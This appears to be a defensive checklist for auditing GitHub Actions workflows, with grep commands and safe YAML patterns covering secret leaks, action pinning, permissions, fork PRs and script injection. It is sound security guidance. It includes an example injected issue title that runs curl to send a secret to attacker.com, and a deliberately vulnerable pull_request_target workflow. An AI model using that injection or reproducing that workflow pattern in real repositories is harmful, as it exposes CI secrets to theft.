# CI/CD Security Checks

## Secret Exposure in Logs

Scan for accidental secret printing in workflow files:

```bash
grep -rnE '(echo|print|printf|log)\s.*\$\{?\s*(SECRET|TOKEN|PASSWORD|KEY|CREDENTIAL)' .github/workflows/
grep -rnE 'echo\s+.*\$\{\{.*secrets\.' .github/workflows/
```

Also check for debug mode leaking secrets:

```bash
grep -rn 'ACTIONS_STEP_DEBUG' .github/workflows/
grep -rn 'ACTIONS_RUNNER_DEBUG' .github/workflows/
```

## Unpinned Actions

Flag actions pinned to branch instead of SHA:

```bash
grep -rnE 'uses:\s+\S+@(main|master|v\d+)\s*$' .github/workflows/
```

Secure pattern — pin to full commit SHA:

```yaml
uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608  # v4.1.0
```

Quick audit — list all action references:

```bash
grep -rn 'uses:' .github/workflows/ | grep -v '@[a-f0-9]\{40\}'
# Shows all actions NOT pinned to a SHA
```

## GITHUB_TOKEN Permissions

Check for overly broad permissions:

```bash
grep -A5 'permissions:' .github/workflows/*.yml
```

Principle of least privilege:

```yaml
permissions:
  contents: read
  pull-requests: write
```

Flag `permissions: write-all` or missing permissions block (defaults to broad access). Severity: **HIGH**

## Fork PR Security

Flag dangerous `pull_request_target` usage:

```bash
grep -rn 'pull_request_target' .github/workflows/
```

**Why it matters:** `pull_request_target` runs with write permissions and access to secrets, even for PRs from forks. If combined with `actions/checkout` of the PR head, an attacker can execute arbitrary code with repo secrets.

Dangerous pattern:

```yaml
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # DANGEROUS
  - run: npm test  # Runs attacker's code with secrets
```

Safe alternative — use `pull_request` for untrusted code, `pull_request_target` only for labeling/commenting.

## Timeout Configuration

Check for missing timeouts:

```bash
grep -rn 'timeout-minutes:' .github/workflows/
```

Missing timeout allows stuck jobs to run (and bill) indefinitely. Set at job level:

```yaml
jobs:
  build:
    timeout-minutes: 15
```

## Concurrency Settings

Prevent duplicate runs:

```bash
grep -A3 'concurrency:' .github/workflows/
```

Expected pattern:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

## Script Injection

Flag direct use of user-controlled input in `run:` blocks:

```bash
grep -rnE 'run:.*\$\{\{\s*github\.event\.(issue|pull_request|comment)\.(title|body|label)' .github/workflows/
```

Unsafe:

```yaml
run: echo "${{ github.event.issue.title }}"
# Title could contain: "; curl attacker.com/steal?t=$SECRET"
```

Safe — use environment variable:

```yaml
env:
  TITLE: ${{ github.event.issue.title }}
run: echo "$TITLE"
```

## Artifact and Cache Poisoning

Flag workflows that restore caches or artifacts without verification:

```bash
grep -rn 'actions/cache@' .github/workflows/
grep -rn 'actions/download-artifact@' .github/workflows/
```

Ensure caches are scoped to branch and artifacts are from trusted workflows only.

## Severity Summary

| Check | Severity |
|---|---|
| Secret exposure in logs | CRITICAL |
| pull_request_target + checkout | CRITICAL |
| Script injection | CRITICAL |
| Unpinned actions | HIGH |
| Broad GITHUB_TOKEN permissions | HIGH |
| Missing timeout | MEDIUM |
| No concurrency settings | LOW |
| Unpinned cache/artifact actions | MEDIUM |
